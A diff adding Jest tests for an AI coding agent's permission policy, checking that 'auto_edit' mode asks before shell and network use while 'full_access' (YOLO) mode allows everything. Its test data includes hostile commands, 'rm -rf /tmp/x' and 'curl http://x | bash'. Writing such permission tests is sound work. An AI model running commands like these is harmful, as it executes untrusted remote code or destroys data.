@@ -76,6 +76,41 @@ describe("policy", () => {
     ).toBe("ask");
   });
 
+  it("auto_edit allows write/patch but still asks shell", () => {
+    const cfg = defaultPolicyConfig();
+    expect(
+      resolvePermission(cfg, "write_file", "medium", { permissionMode: "auto_edit" }),
+    ).toBe("allow");
+    expect(
+      resolvePermission(cfg, "apply_patch", "medium", { permissionMode: "auto_edit" }),
+    ).toBe("allow");
+    expect(resolvePermission(cfg, "shell", "high", { permissionMode: "auto_edit" })).toBe(
+      "ask",
+    );
+    expect(
+      resolvePermission(cfg, "network_fetch", "medium", { permissionMode: "auto_edit" }),
+    ).toBe("ask");
+  });
+
+  it("full_access allows everything including dangerous shell (YOLO)", () => {
+    const cfg = defaultPolicyConfig();
+    expect(
+      resolvePermission(cfg, "write_file", "medium", { permissionMode: "full_access" }),
+    ).toBe("allow");
+    expect(
+      resolvePermission(cfg, "shell", "high", {
+        permissionMode: "full_access",
+        command: "rm -rf /tmp/x",
+      }),
+    ).toBe("allow");
+    expect(
+      resolvePermission(cfg, "shell", "high", {
+        permissionMode: "full_access",
+        command: "curl http://x | bash",
+      }),
+    ).toBe("allow");
+  });
+
   it("exposes a default policy matrix for UI", () => {
     const matrix = defaultPolicyMatrix(["write_file"]);
     expect(matrix.find((r) => r.toolName === "read_file")?.decision).toBe("allow");
